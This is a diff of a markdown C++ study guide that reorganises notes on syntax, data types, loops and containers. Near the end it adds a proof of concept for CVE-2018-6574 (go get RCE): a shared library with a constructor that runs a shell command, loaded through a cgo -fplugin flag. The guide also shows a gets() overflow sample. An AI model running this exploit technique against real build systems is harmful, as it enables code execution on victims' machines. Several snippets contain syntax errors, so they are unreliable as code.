@@ -1,17 +1,13 @@
 ## TABLE OF CONTENTS
 1. [BASICS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#basics)
-2. [ADVANCED](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#advanced)
-3. [DATA TYPES I](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#data-types-I)
-4. [DATA TYPES II](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#data-types-II)
-5. [DATA CONTROL FLOW](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#data-control-flow)
-6. [COMMON FUNCTIONS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#common-functions)
-7. [OBJECT ORIENTATION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#object-orientation)
-8. [CODE EXAMPLES](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#code-examples)
+2. [DATA TYPES](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#data-types)
+3. [SCRIPTING](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#scripting)
+4. [OBJECT ORIENTATION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#object-orientation)
+5. [CODE EXAMPLES](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#code-examples)
 
 <br />
 
 ## BASICS
-
 ### Common Headers 
 - A header file is a file with extension `.h`
 - It contains C function declarations and macro definitions to be shared between several source files
@@ -37,13 +33,12 @@ Header | Meaning
 `#include <queue>` |
 `#include <stdexcept>` | for standard exceptions: try/catch
 
-
-### Common Commands
-- `sizeof()`: returns size of file in byte
-- `system("pause")`: pause output terminal
-
 ### Common Keywords
 - **auto**: C automatically detects the correct data type
+- **public**: Accessible from inside and outside of class 
+- **private**: Accessible only from inside the class where the private instance was created 
+   - private variables are normally written with underscore: `player1 --> player1_`
+- **protected**: Accessible only from inside the class and classes that inherit from it
 - **const**: keep a variable constant
 ```
 void doSomething(const &a) {
@@ -61,7 +56,8 @@ b) Pass the parameter "a" as non-const to function doSomething --> void doSometh
 - **volatile**:
    - tells the compiler that the value of the variable may change at any time
    - without any action being taken by the code the compiler finds nearby
-- **explicit**: avoid the implicit data type conversion within C++
+- **explicit**:
+   - avoid the implicit data type conversion within C++
 ```
 class Car {
 public:
@@ -91,10 +87,6 @@ Operator | Meaning
 `!` | Negation (e.g. !a && !b)
 `5 % 2 = 1` | Modulo
 
-<br />
-
-## ADVANCED
-
 ### Structure of Main
 ```
 int main(int argc, char *argv[]) {  }
@@ -104,7 +96,7 @@ int main(int argc, char *argv[]) {  }
 # char *argv[] (array of pointers) = char **argv (pointer to a pointer to a character)
 ```
 
-### Why do we need Headers (.h)?
+### Headers
 - With headers we avoid dependencies between .cpp files 
 - Example:
    - a.cpp does not work without b.cpp and vice versa
@@ -123,7 +115,6 @@ int main(int argc, char *argv[]) {  }
 - The coder manages the **heap** manually
 - Heap grows from bottom to top
 - Heap is bigger than stack (good for big and growing data sets)
-- Example:
 ```
 # The pointer resides in the stack, but the array inside the heap - with Keyword "new"
 # The array is only reserved, but not filled 
@@ -147,14 +138,14 @@ delete [] a;
 ### Pointer (C-Relict) vs References (C++)
 - Both hand over data to functions (copy/original data possible) 
 - Both represent an internal memory address 
-```
-void doSomething(int *a){} --> Pointer (*)
-void doSomething(const vector<int> &a) {} --> Referenz (&)
-```
 - Difference:
    - Pointer only points to array-beginning (out-of-range memory access possible !)
    - Reference hands over complete object (more comfortable)
    - Conclusion: Use References whenever possible (less error prone) 
+```
+void doSomething(int *a){} --> Pointer (*)
+void doSomething(const vector<int> &a) {} --> Referenz (&)
+```
 
 ### Vector vs List 
 - Vectors save elements in a row 
@@ -170,7 +161,7 @@ a[]              // Vector style
 
 ### Pragma Once (Preprocessor Directive)
 - Ensures that #include-calls only appear once in compiled object (after compilation) 
-- Even if several .cpp files have same call (e.g. #include <iostream>)
+- Even if several .cpp files have same call (e.g. `#include <iostream>`)
 
 ### ++C vs C++
 ```
@@ -198,56 +189,16 @@ using namespaces std;
 int main() {}
 ```
     
-### Create Own Namespace
-- You can create classes with same name but different namespace
-- Neat feature for building logical structures within big code projects 
-- Example:
-```
-namespace factory {
-    class Car;
-}
-
-class factory::Car {
-public:
-    string name;
-    void doSomething();
-};
-    
-int main(){
-    factory::Car c;
-    void factory::Car::doSomething(){};
-}
-```
-
-### Try / Catch / Throw - Exception Handling 
-- Exceptions cost performance and should be treated with care 
-- Thumb of rule: Create your own exception if error possibility is > 5%
-- The keyword for you own exception is **throw** 
-- Example:
-```    
-#include <iostream>
-using namespace std;
-    
-int main() {
-    vector<string> data = {"Maria"};        // some code
-    if (data == "Maria"){
-        throw InvalidParameter();           // We throw an expection an get to the second "catch" down below
-    }
-    try {
-        cout << data.at(2) << endl;
-    }
-    catch(out_of_range &e) {
-        cout << "out_of_range error!" << endl;
-    }
-    catch(InvalidParameter &e){
-        cout << InvalidParameter error!" << endl;
-    return 0;
-}
-```
-    
 <br />
 
-## DATA TYPES I
+## DATA TYPES
+1. [GENERAL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#general)
+2. [ARRAY](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#array)
+3. [VECTOR](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#vector)
+4. [POINTER](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#pointer)
+5. [ITERATOR](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#iterator)
+    
+### General
 - **unsigned int**: only positive numbers
 - **signed int**: positive/negative numbers
 - **integer**: 4 byte, whole number
@@ -262,7 +213,6 @@ int main() {
    - Useful when object has limited amount of properties
    - Useful if you temporarily want to bundle data inside a function
 
-## DATA TYPES II
 
 ### Array (C-relict)
 ```
@@ -353,185 +303,57 @@ int doSomething(vector<int> &vec){
 
 <br />
 
-## DATA CONTROL FLOW
+## SCRIPTING 
+### Create Own Namespace
+- You can create classes with same name but different namespace
+- Neat feature for building logical structures within big code projects 
+- Example:
 ```
-# Standard for-loop
-for (int i = 0; i < 20; i++){
-   command;
+namespace factory {
+    class Car;
+}
+
+class factory::Car {
+public:
+    string name;
+    void doSomething();
 };
-
-
-# Loop through "names" but use dereferenced/original data &name (i/o making copy of "names" and process copied data)
-for (string &name : names) {
-   command;
-};
-
-
-# const = no change of &name
-# auto = C++ identifies automatically the correct data type of "names"
-for (const auto &name : names) {
-   command;
-};
-```
-                       
-- **Attention**: Using "append" within for-loop
-   - If append is used, C++ will check if there are enough memory addresses to allocate
-   - If not, existing list/vector must be moved within RAM
-   - This costs time and ressources (less efficient !)
-   - Example (no allocation):`"existingData123456"`
-   - Example (enough space): `"myData" "existingData123456"`
-   - Example (not enough space): `"myData" "notEnoughSpace" "existingData123456"`
-
-```
-while ( condition ) {
-   command;
-};
-
-while (!cin.eof()){
-   command;
-};
-```
-```
-if ( condition ) {
-   command;
-};
-```
-
-<br />
-
-## COMMON FUNCTIONS
-
-### Function GETS
-- `gets()`: 
-   - Reads characters from the standard input (stdin) and stores them as a C string into
-   - Until a newline character or the end-of-file is reached 
-   - It does not allow to specify a maximum size for str - which can lead to buffer overflows !
-   - Better alternative: `fgets()`
-
-```
-#include <stdlib.h>
-#include <unistd.h>
-#include <stdio.h>
-
-int main(int argc, char **argv)
-{
-  volatile int modified;
-  char buffer[64];
-
-  modified = 0;
-  gets(buffer);                       <-- gets()
-
-  if(modified != 0) {
-      printf("you have changed the 'modified' variable\n");
-  } else {
-      printf("Try again?\n");
-  }
+    
+int main(){
+    factory::Car c;
+    void factory::Car::doSomething(){};
 }
 ```
 
-### Function STRING
-```
-" "                                 --> means C-String 
-string.length()                     --> C++ String functionality
-string.size()                       --> C++ String functionality
-strlen()                            --> C String functionality
-string[4]
-string.at(4)                        --> slower than [], but including error message if char does not exist 
-string.substr(0, 4)                 --> access part of string 
-string.find(" ")                    --> search char in string; output numbers if char does not exist
-                                    --> same like "string::npos" (no position)
-string.append(" ")
-string.insert(4, ",")               --> insert "," at position 4 
-string.erase(5, 3)                  --> remove 3 chars starting from location 5th 
-string.count()
-stringstream.str()                  --> Print saved strings from stringstream 
-```
-
-### Function ENUM
-- Different states can be saved in one variable 
-- C++ handles internally the state as numbers
-```
-# Example 1
-enum Status {offline, online, away, busy};
-Status status = Status::busy;
-if (status == Status::busy){
-cout << "Der Benutzer ist gerade beschäftigt." << endl;
-cout << status << endl; --> 3
-```
-```
-# Example 2
-enum Status {offline, online, away, busy};
-Status status = Status::busy;
-switch (status) {
-    case offline:
-            cout << "Der Benutzer ist gerade offline." << endl;
-            break;
-    case online: 
-    case away:
-    case busy:
-            cout << "Der Benutzer ist gerade online." << endl;
-            break;
-    default:
-            cout << "Ich bin Default Case." << endl;
+### Try / Catch / Throw - Exception Handling 
+- Exceptions cost performance and should be treated with care 
+- Thumb of rule: Create your own exception if error possibility is > 5%
+- The keyword for you own exception is **throw** 
+- Example:
+```    
+#include <iostream>
+using namespace std;
+    
+int main() {
+    vector<string> data = {"Maria"};        // some code
+    if (data == "Maria"){
+        throw InvalidParameter();           // We throw an expection an get to the second "catch" down below
+    }
+    try {
+        cout << data.at(2) << endl;
+    }
+    catch(out_of_range &e) {
+        cout << "out_of_range error!" << endl;
+    }
+    catch(InvalidParameter &e){
+        cout << InvalidParameter error!" << endl;
+    return 0;
 }
 ```
-
-
-### Function PAIR
-- Useful for small code snippets 
-- Not useful when different functions are used at different places (then struct/class better)
-```
-pair<string, int> p("Hallo Welt", 42);
-cout << p.first << endl;
-cout << p.second << endl;
-```
-
-### Function MAP
-- Like "dictionary" in Python
-```
-map<string, int> m = {"test", 123};
-m.insert(pair<string, int>("test", 123);
-m.size()                                     --> 1
-m.at("test")                                 --> 123 (mit Fehlermeldung, falls Element nicht in m vorhanden)
-m.["test"]                                   --> 123 (ohne Fehlmerldung, nur Null-Ausgabe)
-```
-```
-# Standard call of for loop 
-for (map<string, int>::iterator it = m.begin(); it != m.end(); ++it){
-    cout << (*it).first << endl;             --> Dereferencing with "*"
-    cout << it->second << endl;              --> Dereferencing with "->"
-
-# Shorter for loop (possible form C++ Version 11 )
-for (const auto &it : m)
-{   cout << it.first << ":" << it.second << endl; }
-```
-
-
-### Function PRIORITY QUEUE
-```
-priority_queue<int> pq;
-priority_queue<pair<int, string>> pq;
-pq.push(123);
-pq.push(321);
-cout << pq.top()                             --> 321 (values automatically sorted in pq, thus biggest element is print out first 
-pq.pop()                                     --> removes top-element 
-
-pq.push(pair<int, string>(555, "Hallo"));
-cout << pq.top().first << ":" << pq.top().second    --> 555 : Hallo
-```
-
 
 <br />
 
 ## OBJECT ORIENTATION
-
-### Public / Private / Protected 
-- **public**: Accessible from inside and outside of class 
-- **private**: Accessible only from inside the class where the private instance was created 
-   - private variables are normally written with underscore: `player1 --> player1_`
-- **protected**: Accessible only from inside the class and classes that inherit from it
-
-
 ### Constructor
 - The Constructor has normally the same name like the corresponding class 
 ```
@@ -640,9 +462,67 @@ public:
 
 <br />
 
-## EXAMPLES
+## CODE EXAMPLES
+1. [FOR LOOP](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#for-loop)
+2. [WHILE LOOP](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#while-loop)
+3. [INTERACTIVE INPUT/OUTPUT](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#interactive-inputoutput)
+4. [READ / WRITE FILE](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#read--write-file)
+5. [GETS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#gets)
+6. [STRING](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#string)
+7. [ENUM](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#enum)
+8. [PAIR](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#pair)
+9. [MAP](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#map)
+10. [PRIORITY QUEUE](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#priority-queue)
+11. [CVE-2018-6574: go get RCE](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/C++.md#cve-2018-6574-go-get-rce)
 
-### Interactive Input/Output
+<br />
+
+### FOR LOOP
+- Standard for-loop
+```
+for (int i = 0; i < 20; i++){
+   command;
+};
+```
+
+- Loop through "names" but use dereferenced/original data &name (i/o making copy of "names" and process copied data)
+```
+for (string &name : names) {
+   command;
+};
+
+
+# const = no change of &name
+# auto = C++ identifies automatically the correct data type of "names"
+for (const auto &name : names) {
+   command;
+};
+```                     
+- **Attention**: Using "append" within for-loop
+   - If append is used, C++ will check if there are enough memory addresses to allocate
+   - If not, existing list/vector must be moved within RAM
+   - This costs time and ressources (less efficient !)
+   - Example (no allocation):`"existingData123456"`
+   - Example (enough space): `"myData" "existingData123456"`
+   - Example (not enough space): `"myData" "notEnoughSpace" "existingData123456"`
+
+### WHILE LOOP
+```
+while ( condition ) {
+   command;
+};
+
+while (!cin.eof()){
+   command;
+};
+```
+```
+if ( condition ) {
+   command;
+};
+```
+
+### INTERACTIVE INPUT/OUTPUT
 ```
 #include <iostream>
 cin >> x;
@@ -670,7 +550,7 @@ cout << "hello world";
 # Output: Hello" \World
 ```
 
-### Interaction with file
+### READ / WRITE FILE 
 ```
 # read from file 
 ofstream file ("path/to/file"); 
@@ -691,4 +571,165 @@ while(!file.eof()){}
 printf("Hello World:  %.2f", age);
 printf("Hello World:  %s", name); --> does not work because "name" is C++ string
 printf("Hello World:  %s", name.c_str()); --> works because ".c_str()" implements C++ string functionality 
+```
+
+### GETS
+- `gets()`: 
+   - Reads characters from the standard input (stdin) and stores them as a C string into
+   - Until a newline character or the end-of-file is reached 
+   - It does not allow to specify a maximum size for str - which can lead to buffer overflows !
+   - Better alternative: `fgets()`
+
+```
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+
+int main(int argc, char **argv)
+{
+  volatile int modified;
+  char buffer[64];
+
+  modified = 0;
+  gets(buffer);                       <-- gets()
+
+  if(modified != 0) {
+      printf("you have changed the 'modified' variable\n");
+  } else {
+      printf("Try again?\n");
+  }
+}
+```
+
+### STRING
+```
+" "                                 --> means C-String 
+string.length()                     --> C++ String functionality
+string.size()                       --> C++ String functionality
+strlen()                            --> C String functionality
+string[4]
+string.at(4)                        --> slower than [], but including error message if char does not exist 
+string.substr(0, 4)                 --> access part of string 
+string.find(" ")                    --> search char in string; output numbers if char does not exist
+                                    --> same like "string::npos" (no position)
+string.append(" ")
+string.insert(4, ",")               --> insert "," at position 4 
+string.erase(5, 3)                  --> remove 3 chars starting from location 5th 
+string.count()
+stringstream.str()                  --> Print saved strings from stringstream 
+```
+
+### ENUM
+- Different states can be saved in one variable 
+- C++ handles internally the state as numbers
+```
+# Example 1
+enum Status {offline, online, away, busy};
+Status status = Status::busy;
+if (status == Status::busy){
+cout << "Der Benutzer ist gerade beschäftigt." << endl;
+cout << status << endl; --> 3
+```
+```
+# Example 2
+enum Status {offline, online, away, busy};
+Status status = Status::busy;
+switch (status) {
+    case offline:
+            cout << "Der Benutzer ist gerade offline." << endl;
+            break;
+    case online: 
+    case away:
+    case busy:
+            cout << "Der Benutzer ist gerade online." << endl;
+            break;
+    default:
+            cout << "Ich bin Default Case." << endl;
+}
+```
+
+
+### PAIR
+- Useful for small code snippets 
+- Not useful when different functions are used at different places (then struct/class better)
+```
+pair<string, int> p("Hallo Welt", 42);
+cout << p.first << endl;
+cout << p.second << endl;
+```
+
+### MAP
+- Like "dictionary" in Python
+```
+map<string, int> m = {"test", 123};
+m.insert(pair<string, int>("test", 123);
+m.size()                                     --> 1
+m.at("test")                                 --> 123 (mit Fehlermeldung, falls Element nicht in m vorhanden)
+m.["test"]                                   --> 123 (ohne Fehlmerldung, nur Null-Ausgabe)
+```
+```
+# Standard call of for loop 
+for (map<string, int>::iterator it = m.begin(); it != m.end(); ++it){
+    cout << (*it).first << endl;             --> Dereferencing with "*"
+    cout << it->second << endl;              --> Dereferencing with "->"
+
+# Shorter for loop (possible form C++ Version 11 )
+for (const auto &it : m)
+{   cout << it.first << ":" << it.second << endl; }
+```
+
+
+### PRIORITY QUEUE
+```
+priority_queue<int> pq;
+priority_queue<pair<int, string>> pq;
+pq.push(123);
+pq.push(321);
+cout << pq.top()                             --> 321 (values automatically sorted in pq, thus biggest element is print out first 
+pq.pop()                                     --> removes top-element 
+
+pq.push(pair<int, string>(555, "Hallo"));
+cout << pq.top().first << ":" << pq.top().second    --> 555 : Hallo
+```
+
+
+### CVE-2018-6574: go get RCE
+- attack.c
+```
+#include<stdio.h>
+#include<stdlib.h>
+
+#This particular GCC syntax, when used with a function, executes the same function at the startup of the program, i.e before main() function
+static void malicious() __attribute__((constructor));
+
+void malicious() {
+    system("touch /tmp/owned");
+}
+```
+- make attack.so
+- `gcc -shared -o attack.so -fPIC attack.c`
+- create main.go
+```
+package main
+// #cgo CFLAGS: -fplugin=./attack.so
+// typedef int (*intFunc) ();
+//
+// int
+// bridge_int_func(intFunc f)
+// {
+//      return f();
+// }
+//
+// int fortytwo()
+// {
+//      return 42;
+// }
+import "C"
+import "fmt"
+
+func main() {
+    f := C.intFunc(C.fortytwo)
+    fmt.Println(int(C.bridge_int_func(f)))
+    // Output: 42
+}
 ```
